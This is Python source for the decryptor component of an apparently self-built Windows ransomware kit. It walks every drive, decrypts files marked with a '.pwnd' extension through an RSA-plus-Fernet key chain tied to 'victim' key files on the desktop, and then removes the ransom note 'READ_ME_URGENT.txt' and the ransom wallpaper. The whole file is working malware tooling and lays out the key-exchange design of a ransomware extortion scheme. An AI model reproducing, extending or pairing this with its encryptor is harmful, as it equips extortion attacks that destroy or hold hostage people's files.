import os
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from cryptography.fernet import Fernet
import ctypes

class Decryptor:
    def __init__(self):
    
        #used to get desktop path etc
        self.sysRoot = os.path.expanduser('~')

        self.fernkey = None
        self.crypt = None
        self.privkey = None
        self.pubkey = None
        self.fernkey_path = self.sysRoot + "\\AppData\\Local\\Temp\\fernkey.fern"
        self.priv_key_path = self.sysRoot + "\\AppData\\Local\\Temp\\priv_vic_key.btkt"

        #used for file names so they can be easily identified if multiple victims are compromised
        self.name = os.environ["COMPUTERNAME"]

        #get all in-use drive letters, including portable and cd-rom
        dr = [chr(i) for i in range(ord('A'), ord('Z')+1)]
        self.drives = [(d + ":\\") for d in dr if os.path.exists(f'{d}:')]

    def traverse(self):

            self.decrypt_fernkey()

            #Traverse every disk that was found in __init__
            for start in self.drives:
                system = os.walk(start, topdown=True)
                for root, _, files in system:
                    for file in files:
                        file_path = os.path.join(root, file)
                        #Check whether this file was encrypted by this program, it should have a .pwnd extension at the end if it was
                        if "pwnd" not in file.split("."):
                            continue
                        else:
                            self.decrypt_file(file_path)
                        
            try:
                os.remove(self.fernkey_path)
            except:
                pass
            try:
                os.remove(self.priv_key_path)
            except:
                pass
            rmname = self.sysRoot + "\\Desktop\\" + self.name + "-send_me.btkt"
            try:
                os.remove(rmname)
            except:
                pass
            rmname = self.sysRoot + "\\Desktop\\" + self.name + "-use_me.btkt"
            try:
                os.remove(rmname)
            except:
                pass
            rmname = self.sysRoot + "\\Desktop\\READ_ME_URGENT.txt"
            try:
                os.remove(rmname)
            except:
                pass
            rmname = self.sysRoot + "\\Desktop\\background.jpg"
            try:
                os.remove(rmname)
            except:
                pass
            self.restore_wallpaper()

    def decrypt_file(self, file_path):
            try:
                with open(file_path, "rb") as f:
                    #Read all data from file into memory
                    data = f.read()
                    #Decrypt the read data
                    dec_data = self.crypt.decrypt(data)
                    data = None
                
                #Remove the read file and create a new one with the original contents and original name
                os.remove(file_path)
                file_path = file_path[:-5]
                with open(file_path, "wb") as f:
                    f.write(dec_data)
                    dec_data = None
            except:
                pass

    def decrypt_fernkey(self):
            try:
                #Check if the file required to start the decryption chain exists on the victim's desktop
                opname = self.sysRoot + "\\Desktop\\" + self.name + "-use_me.btkt"
                with open(opname, "rb") as f:
                    self.fernkey = f.read()
            except:
                raise Exception("No decryptor file")
            
            #Create a Fernet object with the fernkey used to encrypt victim's private key
            priv_decrypt = Fernet(self.fernkey)
            
            try:
                #Try to decrypt the victim's private key
                with open(self.priv_key_path, "rb") as f:
                    enc_priv_key = f.read()
                    dec_priv_key = priv_decrypt.decrypt(enc_priv_key)
            except:
                raise Exception("No priv_vic_key file")

            #Create the decryptor that will decrypt the fernkey that was used to encrypt the system
            self.privkey = RSA.import_key(dec_priv_key)
            self.crypt = PKCS1_OAEP.new(self.privkey)
            enc_key = None

            #Try to read and decrypt the fernkey that will be used for decryption
            try:
                with open(self.fernkey_path, 'rb') as f:
                    enc_key = f.read()
            except:
                pass
            
            #Create a Fernet object with the key that was used to encrypt the system
            self.fernkey = self.crypt.decrypt(enc_key)
            self.crypt = Fernet(self.fernkey)

    def restore_wallpaper(self):

        #Path for the default Windows 10 Wallpaper
        path = "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg"
        try:
            SPI_SETDESKWALLPAPER = 20
            # Access windows dlls for funcionality eg, changing dekstop wallpaper
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
        except:
            pass

    def main(self):
        usefile = self.name + "-use_me.btkt"
        path = self.sysRoot + "\\Desktop\\" + usefile
        try:
            open(path)
            self.traverse()
        except:
            print("You have to put {} on your Desktop!".format(usefile))
            return

if __name__ == "__main__":
    d = Decryptor()
    d.main()